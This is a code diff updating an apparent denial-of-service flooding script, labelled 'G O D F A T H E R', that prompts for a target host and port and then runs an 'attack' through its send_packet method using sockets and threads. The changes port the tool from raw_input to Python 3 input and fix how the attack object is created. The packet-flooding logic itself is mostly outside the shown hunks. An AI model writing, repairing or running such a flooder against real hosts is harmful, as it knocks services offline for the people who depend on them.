@@ -1,4 +1,8 @@
 #!/usr/bin/python3.7
+"""
+G O D F A T H E R
+
+"""
 
 import socket
 import threading
@@ -19,8 +23,8 @@ class flooding:
 	@classmethod
 	def input(name):
 		return name(
-			raw_input("Host: "),
-                        int(raw_input("Port: "))
+			input("Host: "),
+                        int(input("Port: "))
                 )
 
 	def send_packet(self):
@@ -55,5 +59,5 @@ class flooding:
 				self.connection.close()
 				exit()
 
-attack = flooding(Host,Port)
+attack = flooding.input()
 attack.send_packet()
